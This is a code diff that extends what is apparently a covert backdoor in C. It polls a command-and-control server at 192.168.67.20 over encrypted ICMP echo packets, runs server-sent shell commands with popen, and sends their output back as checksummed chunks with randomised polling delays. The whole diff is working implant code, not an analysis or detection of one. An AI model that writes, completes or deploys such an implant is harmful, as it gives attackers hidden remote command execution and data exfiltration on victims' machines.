@@ -16,6 +16,16 @@
 #include <poll.h>
 
 #define MAX_PAYLOAD_SIZE 1400
+#define MAX_CHUNK_SIZE 1300
+
+#define MESSAGE_REGISTER 1
+#define MESSAGE_POLL 2
+#define MESSAGE_TASK 3
+#define MESSAGE_TASK_RESULT 4
+#define MESSAGE_ANNOUNCE_CHUNKED 5
+#define MESSAGE_CHUNK 6
+#define MESSAGE_ACK 7
+#define MESSAGE_EMPTY 8
 
 static const unsigned char ENCRYPTION_KEY[32] = {
 	0x4e, 0xc9, 0x17, 0xa3, 0x58, 0xd2, 0x6b, 0xf0,
@@ -132,12 +142,19 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 		clock_gettime(CLOCK_MONOTONIC, &current_time);
 		int64_t elapsed_time = (int64_t)(current_time.tv_sec - start_time.tv_sec) * 1000 + (current_time.tv_nsec - start_time.tv_nsec) / 1000000;
 		remaining_time = 30000 - (int)elapsed_time;
+		if (remaining_time <= 0) {
+			break;
+		}
 
 		poll(&waiting_socket, 1, remaining_time);
 		unsigned char response[2048];
 		struct sockaddr_in sender = {0};
 		socklen_t sender_length = sizeof(sender);
-		size_t response_length = recvfrom(fd, response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_length);
+		ssize_t received_length = recvfrom(fd, response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_length);
+		if (received_length < 0) {
+			continue;
+		}
+		size_t response_length = (size_t)received_length;
 		size_t ip_header_length = (response[0] & 0x0f) * 4;
 		if (response_length < ip_header_length + 8) {
 			continue;
@@ -162,6 +179,10 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 unsigned char *execute_task(const char *command, size_t *output_length) {
 
 	FILE *process = popen(command, "r");
+	if (process == NULL) {
+		*output_length = 0;
+		return NULL;
+	}
 
 	size_t capacity = 4096;
 	size_t used_bytes = 0;
@@ -314,14 +335,180 @@ int parse_message(const unsigned char *received_message, size_t received_message
 
 }
 
+struct ChunkedTransfer {
+	uint32_t transfer_id;
+	uint32_t total_amount_of_chunks;
+	uint32_t next_chunk_index;
+	size_t task_output_length;
+	unsigned char *task_output;
+	uint32_t *chunk_checksums;
+};
 
+struct ChunkedTransfer *start_chunked_transfer(unsigned char *task_output, size_t task_output_length) {
+
+	struct ChunkedTransfer *transfer = malloc(sizeof(struct ChunkedTransfer));
+	transfer->transfer_id = (uint32_t)rand();
+	transfer->total_amount_of_chunks = (uint32_t)((task_output_length + MAX_CHUNK_SIZE - 1) / MAX_CHUNK_SIZE);
+	if (transfer->total_amount_of_chunks == 0) {
+		transfer->total_amount_of_chunks = 1;
+	}
+	transfer->next_chunk_index = 0;
+	transfer->task_output = task_output;
+	transfer->task_output_length = task_output_length;
+	transfer->chunk_checksums = malloc(transfer->total_amount_of_chunks * sizeof(uint32_t));
+
+	for (uint32_t i = 0; i < transfer->total_amount_of_chunks; i++) {
+		size_t offset = (size_t)i * MAX_CHUNK_SIZE;
+		size_t length = task_output_length - offset;
+		if (length > MAX_CHUNK_SIZE) {
+			length = MAX_CHUNK_SIZE;
+		}
+		transfer->chunk_checksums[i] = (uint32_t)crc32(0, task_output + offset, length);
+	}
+
+	return transfer;
+
+}
+
+unsigned char *build_chunked_transfer_announcement(const struct ChunkedTransfer *transfer, size_t *chunk_announcement_body_length) {
+
+	size_t body_length = 12 + (size_t)transfer->total_amount_of_chunks * 4;
+	unsigned char *body = malloc(body_length);
+
+	uint32_t network_byte_order;
+	network_byte_order = htobe32(transfer->transfer_id);
+	memcpy(body, &network_byte_order, sizeof(network_byte_order));
+	network_byte_order = htobe32(transfer->total_amount_of_chunks);
+	memcpy(body + 4, &network_byte_order, sizeof(network_byte_order));
+	network_byte_order = htobe32((uint32_t)transfer->task_output_length);
+	memcpy(body + 8, &network_byte_order, sizeof(network_byte_order));
+
+	for (uint32_t i = 0; i < transfer->total_amount_of_chunks; i++) {
+		network_byte_order = htobe32(transfer->chunk_checksums[i]);
+		memcpy(body + 12 + (size_t)i * 4, &network_byte_order, sizeof(network_byte_order));
+	}
+
+	*chunk_announcement_body_length = body_length;
+	return body;
+
+}
+
+unsigned char *build_chunk(const struct ChunkedTransfer *transfer, size_t *chunk_body_length) {
+
+	if (transfer->next_chunk_index >= transfer->total_amount_of_chunks) {
+		return NULL;
+	}
+
+	uint32_t chunk_index = transfer->next_chunk_index;
+	size_t offset = (size_t)chunk_index * MAX_CHUNK_SIZE;
+	size_t data_length = transfer->task_output_length - offset;
+	if (data_length > MAX_CHUNK_SIZE) {
+		data_length = MAX_CHUNK_SIZE;
+	}
+
+	size_t body_length = 16 + data_length;
+	unsigned char *body = malloc(body_length);
+
+	uint32_t network_byte_order;
+	network_byte_order = htobe32(transfer->transfer_id);
+	memcpy(body, &network_byte_order, sizeof(network_byte_order));
+	network_byte_order = htobe32(chunk_index);
+	memcpy(body + 4, &network_byte_order, sizeof(network_byte_order));
+	network_byte_order = htobe32(transfer->total_amount_of_chunks);
+	memcpy(body + 8, &network_byte_order, sizeof(network_byte_order));
+	network_byte_order = htobe32(transfer->chunk_checksums[chunk_index]);
+	memcpy(body + 12, &network_byte_order, sizeof(network_byte_order));
+	memcpy(body + 16, transfer->task_output + offset, data_length);
+
+	*chunk_body_length = body_length;
+	return body;
+
+}
+
+int handle_ack(struct ChunkedTransfer **transfer, const unsigned char *ack_body, size_t ack_body_length) {
+
+	if (transfer == NULL || *transfer == NULL || ack_body_length < 8) {
+		return -1;
+	}
+
+	uint32_t network_byte_order;
+	memcpy(&network_byte_order, ack_body, sizeof(network_byte_order));
+	uint32_t transfer_id = be32toh(network_byte_order);
+	memcpy(&network_byte_order, ack_body + 4, sizeof(network_byte_order));
+	uint32_t index = be32toh(network_byte_order);
+
+	if (transfer_id != (*transfer)->transfer_id || index != (*transfer)->next_chunk_index) {
+		return -1;
+	}
+
+	(*transfer)->next_chunk_index++;
+
+	if ((*transfer)->next_chunk_index >= (*transfer)->total_amount_of_chunks) {
+		free((*transfer)->task_output);
+		free((*transfer)->chunk_checksums);
+		free(*transfer);
+		*transfer = NULL;
+		return 1;
+	}
+
+	return 0;
+
+}
+
+void random_poll_delay(const struct Config *configuration) {
+
+	int delay_seconds = configuration->minimum_poll_seconds;
+	if (configuration->maximum_poll_seconds > configuration->minimum_poll_seconds) {
+		delay_seconds += rand() % (configuration->maximum_poll_seconds - configuration->minimum_poll_seconds + 1);
+	}
+
+	sleep((unsigned int)delay_seconds);
+
+}
+
+void handle_reply(const unsigned char *reply, size_t reply_length, uint64_t device_id, struct ChunkedTransfer **transfer, unsigned char **task_pending_result, size_t *task_pending_result_length) {
+
+	size_t received_message_length = 0;
+	unsigned char *received_message = decrypt_uncompress(reply, reply_length, &received_message_length);
+	if (received_message == NULL) {
+		return;
+	}
+
+	uint8_t received_message_type = 0;
+	uint64_t received_device_id = 0;
+	unsigned char *received_message_body = NULL;
+	size_t received_message_body_length = 0;
+
+	if (parse_message(received_message, received_message_length, &received_message_type, &received_device_id, &received_message_body, &received_message_body_length) != 0) {
+		free(received_message);
+		return;
+	}
+
+	if (received_device_id != device_id) {
+		free(received_message);
+		free(received_message_body);
+		return;
+	}
+
+	if (received_message_type == MESSAGE_TASK && *task_pending_result == NULL && *transfer == NULL) {
+		*task_pending_result = execute_task((const char *)received_message_body, task_pending_result_length);
+	}
+
+	if (received_message_type == MESSAGE_ACK) {
+		handle_ack(transfer, received_message_body, received_message_body_length);
+	}
+
+	free(received_message);
+	free(received_message_body);
+
+}
 
 int main() {
 
 	struct Config configuration = {
 		.minimum_poll_seconds = 1,
-		.maximum_poll_seconds = 3,
-		.compression_level = 6
+		.maximum_poll_seconds = 30,
+		.compression_level = 9
 	};
 
 	uint64_t device_id = get_device_id();
@@ -329,18 +516,77 @@ int main() {
 	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
 	srand((int)time(NULL) ^ (int)getpid());
 
-	char message[1024];
-	sprintf(message, "%016" PRIx64, device_id);
+	uint16_t sequence = 0;
+	int registered = 0;
+	struct ChunkedTransfer *transfer = NULL;
+	unsigned char *task_pending_result = NULL;
+	size_t task_pending_result_length = 0;
+	unsigned char reply[2048];
 
-	size_t data_to_send_length = 0;
-	unsigned char *data_to_send = compress_encrypt((const unsigned char *)message, strlen(message), configuration.compression_level, &data_to_send_length);
+	while (1) {
 
+		uint8_t message_type = MESSAGE_POLL;
+		unsigned char *message_body = NULL;
+		size_t message_body_length = 0;
 
-	size_t received_message_length = 0;
-	unsigned char *received_message = decrypt_uncompress(data_to_send, data_to_send_length, &received_message_length);
+		if (!registered) {
+			message_type = MESSAGE_REGISTER;
+			registered = 1;
+		}
 
-	free(data_to_send);
-	free(received_message);
+		if (transfer != NULL && transfer->next_chunk_index == 0) {
+			message_type = MESSAGE_ANNOUNCE_CHUNKED;
+			message_body = build_chunked_transfer_announcement(transfer, &message_body_length);
+		} else if (transfer != NULL) {
+			message_type = MESSAGE_CHUNK;
+			message_body = build_chunk(transfer, &message_body_length);
+		} else if (task_pending_result != NULL) {
+			message_type = MESSAGE_TASK_RESULT;
+			message_body = task_pending_result;
+			message_body_length = task_pending_result_length;
+		}
+
+		size_t message_length = 0;
+		unsigned char *message = build_message(message_type, device_id, message_body, message_body_length, &message_length);
+
+		size_t data_to_send_length = 0;
+		unsigned char *data_to_send = compress_encrypt(message, message_length, configuration.compression_level, &data_to_send_length);
+		free(message);
+
+		if (data_to_send == NULL || data_to_send_length > MAX_PAYLOAD_SIZE) {
+
+			if (message_type == MESSAGE_TASK_RESULT) {
+				transfer = start_chunked_transfer(task_pending_result, task_pending_result_length);
+				task_pending_result = NULL;
+			}
+
+		} else {
+
+			ssize_t reply_length = send_echo_request(configuration.c2_ip, sequence, data_to_send, data_to_send_length, reply);
+			sequence++;
+
+			if (message_type == MESSAGE_TASK_RESULT && reply_length >= 0) {
+				free(task_pending_result);
+				task_pending_result = NULL;
+			}
+
+			if (reply_length > 0) {
+				handle_reply(reply, (size_t)reply_length, device_id, &transfer, &task_pending_result, &task_pending_result_length);
+			}
+
+		}
+
+		free(data_to_send);
+
+		if (message_type == MESSAGE_ANNOUNCE_CHUNKED || message_type == MESSAGE_CHUNK) {
+			free(message_body);
+		}
+
+		if (transfer == NULL || data_to_send == NULL || data_to_send_length > MAX_PAYLOAD_SIZE) {
+			random_poll_delay(&configuration);
+		}
+
+	}
 
 	return 0;
 }
